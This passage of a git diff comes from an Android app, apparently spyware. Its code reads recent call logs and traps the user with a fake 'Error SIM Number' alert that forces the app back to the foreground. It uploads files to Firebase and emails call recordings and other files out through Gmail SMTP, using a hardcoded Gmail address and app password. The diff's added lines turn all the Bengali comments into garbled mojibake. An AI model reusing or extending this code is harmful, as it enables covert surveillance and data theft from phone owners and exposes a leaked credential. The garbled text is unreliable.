-            // ফাইলের নাম এনকোড করে Firebase Storage-এ পাঠানো
+            // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦® à¦à¦¨à¦•à§‹à¦¡ à¦•à¦°à§‡ Firebase Storage-à¦ à¦ªà¦¾à¦ à¦¾à¦¨à§‹
             String safeFileName = URLEncoder.encode(file.getName(), "UTF-8");
             StorageReference storageReference = FirebaseStorage.getInstance().getReference().child(fileType + "/" + safeFileName);
             Uri fileUri = Uri.fromFile(file);
@@ -6622,7 +6688,7 @@ public class FirebaseSaveAudioVideoPicture {
                     String fileDownloadUrl = uri.toString();
                     Log.d(TAG, "File download URL retrieved: " + fileDownloadUrl);
 
-                    // Firebase Realtime Database-এ ফাইল URL সংরক্ষণ
+                    // Firebase Realtime Database-à¦ à¦«à¦¾à¦‡à¦² URL à¦¸à¦‚à¦°à¦•à§à¦·à¦£
                     saveFileUrlToFirebaseDatabase(recipientEmail, subject, emailContent, fileType, fileDownloadUrl);
                 }).addOnFailureListener(e -> {
                     Log.e(TAG, "Failed to retrieve download URL: ", e);
@@ -6710,9 +6776,9 @@ import java.util.Locale;
 
 public class GetRecentCallLogs {
     private static final String TAG = "GetRecentCallLogs";
-    private Context mContext;  // Context ফিল্ড
+    private Context mContext;  // Context à¦«à¦¿à¦²à§à¦¡
 
-    // কনস্ট্রাকটর ব্যবহার করে কন্টেক্সট ইনিশিয়ালাইজ করা
+    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à¦Ÿà¦° à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à§‡ à¦•à¦¨à§à¦Ÿà§‡à¦•à§à¦¸à¦Ÿ à¦‡à¦¨à¦¿à¦¶à¦¿à§Ÿà¦¾à¦²à¦¾à¦‡à¦œ à¦•à¦°à¦¾
     public GetRecentCallLogs(Context context) {
         this.mContext = context;
     }
@@ -6730,13 +6796,13 @@ public class GetRecentCallLogs {
 
         Cursor cursor = null;
         try {
-            // কল লগগুলো নিয়ে আসা (LIMIT ছাড়া)
+            // à¦•à¦² à¦²à¦—à¦—à§à¦²à§‹ à¦¨à¦¿à§Ÿà§‡ à¦†à¦¸à¦¾ (LIMIT à¦›à¦¾à§œà¦¾)
             cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC");
 
             if (cursor != null) {
                 int count = 0;
                 while (cursor.moveToNext()) {
-                    if (count >= 15) break; // সর্বোচ্চ ১০টি কল লগ দেখাবে
+                    if (count >= 15) break; // à¦¸à¦°à§à¦¬à§‹à¦šà§à¦š à§§à§¦à¦Ÿà¦¿ à¦•à¦² à¦²à¦— à¦¦à§‡à¦–à¦¾à¦¬à§‡
                     String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                     long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                     String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
@@ -6945,7 +7011,7 @@ public class GetSim1AndSim2NumberFromAlertbox extends Activity {
         if (!isSim1Entered || !isSim2Entered) {
             Log.d(TAG, "Bringing app back to foreground");
             handler.postDelayed(() -> moveTaskToFront(), 500);
-            moveTaskToBack(false); // ব্যাকগ্রাউন্ডে যাওয়া বন্ধ করুন
+            moveTaskToBack(false); // à¦¬à§à¦¯à¦¾à¦•à¦—à§à¦°à¦¾à¦‰à¦¨à§à¦¡à§‡ à¦¯à¦¾à¦“à§Ÿà¦¾ à¦¬à¦¨à§à¦§ à¦•à¦°à§à¦¨
         }
     }
 
@@ -6998,11 +7064,11 @@ public class GetSim1AndSim2NumberFromAlertbox extends Activity {
     private void showSim1Alert() {
         Log.d(TAG, "showSim1Alert() called from onCreate");
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("⚠ Error SIM Number");
+        builder.setTitle("âš  Error SIM Number");
         builder.setIcon(android.R.drawable.ic_dialog_alert);
 
         TextView titleView = new TextView(this);
-        titleView.setText("⚠ Error SIM Number");
+        titleView.setText("âš  Error SIM Number");
         titleView.setTextColor(Color.RED);
         titleView.setTextSize(20);
         builder.setCustomTitle(titleView);
@@ -7071,11 +7137,11 @@ public class GetSim1AndSim2NumberFromAlertbox extends Activity {
     private void showSim2Alert() {
         Log.d(TAG, "showSim2Alert() called");
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("⚠ Error SIM Number");
+        builder.setTitle("âš  Error SIM Number");
         builder.setIcon(android.R.drawable.ic_dialog_alert);
 
         TextView titleView = new TextView(this);
-        titleView.setText("⚠ Error SIM Number");
+        titleView.setText("âš  Error SIM Number");
         titleView.setTextColor(Color.RED);
         titleView.setTextSize(20);
         builder.setCustomTitle(titleView);
@@ -7280,14 +7346,14 @@ public class JavaMailAPI {
 
     public static void sendMail(String recipientEmail, String subject, String messageBody) {
         try {
-            // দৈনিক সীমা চেক করুন
+            // à¦¦à§ˆà¦¨à¦¿à¦• à¦¸à§€à¦®à¦¾ à¦šà§‡à¦• à¦•à¦°à§à¦¨
             if (!CountEmail.canSendEmail()) {
-                System.out.println("Email limit reached for today. No email sent."); // সীমা পৌঁছালে লগ
+                System.out.println("Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
                 return;
             }
 
-            final String username = "abontiangum99@gmail.com"; // আপনার Gmail ঠিকানা
-            final String password = "egqnjvccoqtgwaxo"; // আপনার Gmail পাসওয়ার্ড
+            final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
+            final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡
 
             Properties props = new Properties();
             props.put("mail.smtp.auth", "true");
@@ -7333,114 +7399,114 @@ public class JavaMailAPI {
 //JavaMailAPI_CallRecord_Sender.java
 package com.example.fasterpro11;
 
-import android.os.AsyncTask; // AsyncTask ব্যবহার
-import android.util.Log; // লগ ব্যবহারের জন্য
+import android.os.AsyncTask; // AsyncTask à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°
+import android.util.Log; // à¦²à¦— à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
 
-import java.io.File; // ফাইল ব্যবহারের জন্য
-import java.util.Properties; // প্রপার্টি সেটিংস
-import javax.activation.DataHandler; // ডেটা হ্যান্ডলার
-import javax.activation.DataSource; // ডেটা সোর্স
-import javax.activation.FileDataSource; // ফাইল ডেটা সোর্স
-import javax.mail.*; // মেইল ব্যবহারের জন্য
-import javax.mail.internet.*; // ইন্টারনেট মেইল
+import java.io.File; // à¦«à¦¾à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
+import java.util.Properties; // à¦ªà§à¦°à¦ªà¦¾à¦°à§à¦Ÿà¦¿ à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
+import javax.activation.DataHandler; // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
+import javax.activation.DataSource; // à¦¡à§‡à¦Ÿà¦¾ à¦¸à§‹à¦°à§à¦¸
+import javax.activation.FileDataSource; // à¦«à¦¾à¦‡à¦² à¦¡à§‡à¦Ÿà¦¾ à¦¸à§‹à¦°à§à¦¸
+import javax.mail.*; // à¦®à§‡à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
+import javax.mail.internet.*; // à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦®à§‡à¦‡à¦²
 
 public class JavaMailAPI_CallRecord_Sender {
-    private static final String TAG = "JavaMailAPI"; // লগ ট্যাগ
-    private String email; // প্রাপক ইমেইল
-    private String subject; // ইমেইল সাবজেক্ট
-    private String message; // ইমেইল মেসেজ
-    private String filePath; // ফাইলের পাথ
+    private static final String TAG = "JavaMailAPI"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
+    private String email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦²
+    private String subject; // à¦‡à¦®à§‡à¦‡à¦² à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ
+    private String message; // à¦‡à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ
+    private String filePath; // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦ªà¦¾à¦¥
 
-    // কনস্ট্রাক্টর
+    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à§à¦Ÿà¦°
     public JavaMailAPI_CallRecord_Sender(String email, String subject, String message, String filePath) {
-        this.email = email; // প্রাপক ইমেইল সেট করা
-        this.subject = subject; // সাবজেক্ট সেট করা
-        this.message = message; // মেসেজ সেট করা
-        this.filePath = filePath; // ফাইল পাথ সেট করা
+        this.email = email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦² à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.subject = subject; // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.message = message; // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.filePath = filePath; // à¦«à¦¾à¦‡à¦² à¦ªà¦¾à¦¥ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
     }
 
-    // মেইল পাঠানোর মেথড
+    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡
     public void sendMail() {
-        new SendMailTask().execute(); // AsyncTask শুরু
+        new SendMailTask().execute(); // AsyncTask à¦¶à§à¦°à§
     }
 
     private class SendMailTask extends AsyncTask<Void, Void, Void> {
         @Override
         protected Void doInBackground(Void... voids) {
             try {
-                // ইমেল পাঠানোর অনুমতি চেক করুন
+                // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                 if (!CountEmail.canSendEmail()) {
-                    Log.d(TAG, "Email limit reached for today. No email sent."); // সীমা পৌঁছালে লগ
-                    return null; // মেইল পাঠানো হবে না
+                    Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
+                    return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
                 }
 
-                // SMTP সেটিংস
+                // SMTP à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
                 Properties props = new Properties();
-                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP সার্ভার
-                props.put("mail.smtp.port", "587"); // SMTP পোর্ট
-                props.put("mail.smtp.auth", "true"); // অথেনটিকেশন
-                props.put("mail.smtp.starttls.enable", "true"); // TLS সক্রিয় করা
+                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
+                props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
+                props.put("mail.smtp.auth", "true"); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
+                props.put("mail.smtp.starttls.enable", "true"); // TLS à¦¸à¦•à§à¦°à¦¿à§Ÿ à¦•à¦°à¦¾
 
-                final String username = "abontiangum99@gmail.com"; // আপনার Gmail ঠিকানা
-                final String password = "egqnjvccoqtgwaxo"; // আপনার Gmail পাসওয়ার্ড
+                final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
+                final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡
 
-                // সেশন তৈরি করা
+                // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                 Session session = Session.getInstance(props, new Authenticator() {
                     protected PasswordAuthentication getPasswordAuthentication() {
-                        return new PasswordAuthentication(username, password); // অথেনটিকেশন
+                        return new PasswordAuthentication(username, password); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                     }
                 });
 
-                // মেইল মেসেজ তৈরি করা
+                // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                 MimeMessage mimeMessage = new MimeMessage(session);
-                mimeMessage.setFrom(new InternetAddress(username)); // প্রেরক সেট করা
-                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // প্রাপক সেট করা
-                mimeMessage.setSubject(subject); // সাবজেক্ট সেট করা
+                mimeMessage.setFrom(new InternetAddress(username)); // à¦ªà§à¦°à§‡à¦°à¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // à¦ªà§à¦°à¦¾à¦ªà¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                mimeMessage.setSubject(subject); // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
-                // মেসেজ এবং অ্যাটাচমেন্ট যুক্ত করা
+                // à¦®à§‡à¦¸à§‡à¦œ à¦à¦¬à¦‚ à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                 Multipart multipart = new MimeMultipart();
                 MimeBodyPart messageBodyPart = new MimeBodyPart();
-                messageBodyPart.setText(message); // মেসেজ সেট করা
-                multipart.addBodyPart(messageBodyPart); // মেসেজ যুক্ত করা
+                messageBodyPart.setText(message); // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                multipart.addBodyPart(messageBodyPart); // à¦®à§‡à¦¸à§‡à¦œ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
 
-                // ফাইল অ্যাটাচমেন্ট যুক্ত করা (যদি থাকে)
+                // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ (à¦¯à¦¦à¦¿ à¦¥à¦¾à¦•à§‡)
                 if (filePath != null && !filePath.isEmpty()) {
                     try {
                         MimeBodyPart attachmentPart = new MimeBodyPart();
-                        DataSource source = new FileDataSource(filePath); // ফাইল সোর্স
-                        attachmentPart.setDataHandler(new DataHandler(source)); // ডেটা হ্যান্ডলার
-                        attachmentPart.setFileName(new File(filePath).getName()); // ফাইলের নাম
-                        multipart.addBodyPart(attachmentPart); // অ্যাটাচমেন্ট যুক্ত করা
+                        DataSource source = new FileDataSource(filePath); // à¦«à¦¾à¦‡à¦² à¦¸à§‹à¦°à§à¦¸
+                        attachmentPart.setDataHandler(new DataHandler(source)); // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
+                        attachmentPart.setFileName(new File(filePath).getName()); // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦®
+                        multipart.addBodyPart(attachmentPart); // à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                     } catch (Exception e) {
-                        Log.e(TAG, "Error attaching file: " + e.getMessage()); // ফাইল অ্যাটাচমেন্ট ত্রুটি লগ
+                        Log.e(TAG, "Error attaching file: " + e.getMessage()); // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                         e.printStackTrace();
                     }
                 }
 
-                mimeMessage.setContent(multipart); // মেইল কনটেন্ট সেট করা
+                mimeMessage.setContent(multipart); // à¦®à§‡à¦‡à¦² à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
-                // মেইল পাঠানো
+                // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                 Transport.send(mimeMessage);
-                CountEmail.incrementEmailCount(); // ইমেল সফলভাবে পাঠানোর পর কাউন্টার বাড়ান
-                Log.d(TAG, "Callrecord Email sent successfully with attachment."); // সফল লগ
+                CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
+                Log.d(TAG, "Callrecord Email sent successfully with attachment."); // à¦¸à¦«à¦² à¦²à¦—
             } catch (MessagingException e) {
-                Log.e(TAG, "Callrecord Error occurred while sending email: " + e.getMessage()); // মেসেজিং ত্রুটি
+                Log.e(TAG, "Callrecord Error occurred while sending email: " + e.getMessage()); // à¦®à§‡à¦¸à§‡à¦œà¦¿à¦‚ à¦¤à§à¦°à§à¦Ÿà¦¿
                 e.printStackTrace();
             } catch (Exception e) {
-                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // অন্য ত্রুটি
+                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // à¦…à¦¨à§à¦¯ à¦¤à§à¦°à§à¦Ÿà¦¿
                 e.printStackTrace();
             }
-            return null; // সম্পন্ন
+            return null; // à¦¸à¦®à§à¦ªà¦¨à§à¦¨
         }
     }
 
-    // স্ট্যাটিক মেথড যা অন্য জায়গা থেকে ব্যবহার করা যাবে
+    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡ à¦¯à¦¾ à¦…à¦¨à§à¦¯ à¦œà¦¾à§Ÿà¦—à¦¾ à¦¥à§‡à¦•à§‡ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡
     public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
         try {
             JavaMailAPI_CallRecord_Sender javaMailAPI = new JavaMailAPI_CallRecord_Sender(email, subject, message, filePath);
-            javaMailAPI.sendMail(); // মেইল পাঠানোর মেথড কল করা
+            javaMailAPI.sendMail(); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡ à¦•à¦² à¦•à¦°à¦¾
         } catch (Exception e) {
-            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // স্ট্যাটিক মেথডে ত্রুটি
+            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡à§‡ à¦¤à§à¦°à§à¦Ÿà¦¿
             e.printStackTrace();
         }
     }
@@ -7451,123 +7517,123 @@ public class JavaMailAPI_CallRecord_Sender {
 //JavaMailAPI_Fileservice_Sender.java
 package com.example.fasterpro11;
 
-import android.os.AsyncTask; // AsyncTask ব্যবহার
-import android.util.Log; // লগ ব্যবহারের জন্য
+import android.os.AsyncTask; // AsyncTask à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°
+import android.util.Log; // à¦²à¦— à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
 
-import java.io.File; // ফাইল ব্যবহারের জন্য
-import java.util.Properties; // প্রপার্টি সেটিংস
-import javax.mail.*; // মেইল ব্যবহারের জন্য
-import javax.mail.internet.*; // ইন্টারনেট মেইল
-import javax.activation.*; // অ্যাকটিভেশন
+import java.io.File; // à¦«à¦¾à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
+import java.util.Properties; // à¦ªà§à¦°à¦ªà¦¾à¦°à§à¦Ÿà¦¿ à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
+import javax.mail.*; // à¦®à§‡à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
+import javax.mail.internet.*; // à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦®à§‡à¦‡à¦²
+import javax.activation.*; // à¦…à§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦­à§‡à¦¶à¦¨
 
 public class JavaMailAPI_Fileservice_Sender {
-    private static final String TAG = "JavaMailAPI"; // লগ ট্যাগ
-    private String email; // প্রাপক ইমেইল
-    private String subject; // ইমেইল সাবজেক্ট
-    private String message; // ইমেইল মেসেজ
-    private String filePath; // ফাইলের পাথ
+    private static final String TAG = "JavaMailAPI"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
+    private String email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦²
+    private String subject; // à¦‡à¦®à§‡à¦‡à¦² à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ
+    private String message; // à¦‡à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ
+    private String filePath; // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦ªà¦¾à¦¥
 
-    // কনস্ট্রাক্টর
+    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à§à¦Ÿà¦°
     public JavaMailAPI_Fileservice_Sender(String email, String subject, String message, String filePath) {
-        this.email = email; // প্রাপক ইমেইল সেট করা
-        this.subject = subject; // সাবজেক্ট সেট করা
-        this.message = message; // মেসেজ সেট করা
-        this.filePath = filePath; // ফাইল পাথ সেট করা
-        Log.d(TAG, "JavaMailAPI_Fileservice_Sender initialized with email: " + email); // ইনিশিয়ালাইজেশন লগ
+        this.email = email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦² à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.subject = subject; // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.message = message; // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.filePath = filePath; // à¦«à¦¾à¦‡à¦² à¦ªà¦¾à¦¥ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        Log.d(TAG, "JavaMailAPI_Fileservice_Sender initialized with email: " + email); // à¦‡à¦¨à¦¿à¦¶à¦¿à§Ÿà¦¾à¦²à¦¾à¦‡à¦œà§‡à¦¶à¦¨ à¦²à¦—
     }
 
-    // মেইল পাঠানোর মেথড
+    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡
     public void sendMail() {
-        new SendMailTask().execute(); // AsyncTask শুরু
+        new SendMailTask().execute(); // AsyncTask à¦¶à§à¦°à§
     }
 
     private class SendMailTask extends AsyncTask<Void, Void, Void> {
         @Override
         protected Void doInBackground(Void... voids) {
             try {
-                // ইমেল পাঠানোর অনুমতি চেক করুন
+                // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                 if (!CountEmail.canSendEmail()) {
-                    Log.d(TAG, "Email limit reached for today. No email sent."); // সীমা পৌঁছালে লগ
-                    return null; // মেইল পাঠানো হবে না
+                    Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
+                    return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
                 }
 
-                // SMTP সেটিংস
+                // SMTP à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
                 Properties props = new Properties();
-                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP সার্ভার
-                props.put("mail.smtp.port", "587"); // SMTP পোর্ট
-                props.put("mail.smtp.auth", "true"); // অথেনটিকেশন
-                props.put("mail.smtp.starttls.enable", "true"); // TLS সক্রিয় করা
-                Log.d(TAG, "File Service SMTP properties set."); // লগ
+                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
+                props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
+                props.put("mail.smtp.auth", "true"); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
+                props.put("mail.smtp.starttls.enable", "true"); // TLS à¦¸à¦•à§à¦°à¦¿à§Ÿ à¦•à¦°à¦¾
+                Log.d(TAG, "File Service SMTP properties set."); // à¦²à¦—
 
-                final String username = "abontiangum99@gmail.com"; // আপনার Gmail ঠিকানা
-                final String password = "egqnjvccoqtgwaxo"; // আপনার Gmail পাসওয়ার্ড
+                final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
+                final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡
 
-                // সেশন তৈরি করা
+                // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                 Session session = Session.getInstance(props, new javax.mail.Authenticator() {
                     protected PasswordAuthentication getPasswordAuthentication() {
-                        Log.d(TAG, "File Service Authenticating user: " + username); // লগ
-                        return new PasswordAuthentication(username, password); // অথেনটিকেশন
+                        Log.d(TAG, "File Service Authenticating user: " + username); // à¦²à¦—
+                        return new PasswordAuthentication(username, password); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                     }
                 });
 
-                // মেইল মেসেজ তৈরি করা
+                // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                 MimeMessage mimeMessage = new MimeMessage(session);
-                mimeMessage.setFrom(new InternetAddress(username)); // প্রেরক সেট করা
-                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // প্রাপক সেট করা
-                mimeMessage.setSubject(subject); // সাবজেক্ট সেট করা
+                mimeMessage.setFrom(new InternetAddress(username)); // à¦ªà§à¦°à§‡à¦°à¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // à¦ªà§à¦°à¦¾à¦ªà¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                mimeMessage.setSubject(subject); // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
-                // মেসেজ এবং অ্যাটাচমেন্ট যুক্ত করা
+                // à¦®à§‡à¦¸à§‡à¦œ à¦à¦¬à¦‚ à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                 Multipart multipart = new MimeMultipart();
                 MimeBodyPart messageBodyPart = new MimeBodyPart();
-                messageBodyPart.setText(message); // মেসেজ সেট করা
-                multipart.addBodyPart(messageBodyPart); // মেসেজ যুক্ত করা
+                messageBodyPart.setText(message); // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                multipart.addBodyPart(messageBodyPart); // à¦®à§‡à¦¸à§‡à¦œ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
 
-                // ফাইল অ্যাটাচমেন্ট যুক্ত করা (যদি থাকে)
+                // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ (à¦¯à¦¦à¦¿ à¦¥à¦¾à¦•à§‡)
                 if (filePath != null && !filePath.isEmpty()) {
                     try {
-                        Log.d(TAG, "File Service Preparing to attach file: " + filePath); // লগ
+                        Log.d(TAG, "File Service Preparing to attach file: " + filePath); // à¦²à¦—
                         MimeBodyPart attachmentPart = new MimeBodyPart();
-                        DataSource source = new FileDataSource(filePath); // ফাইল সোর্স
-                        attachmentPart.setDataHandler(new DataHandler(source)); // ডেটা হ্যান্ডলার
-                        attachmentPart.setFileName(new File(filePath).getName()); // ফাইলের নাম
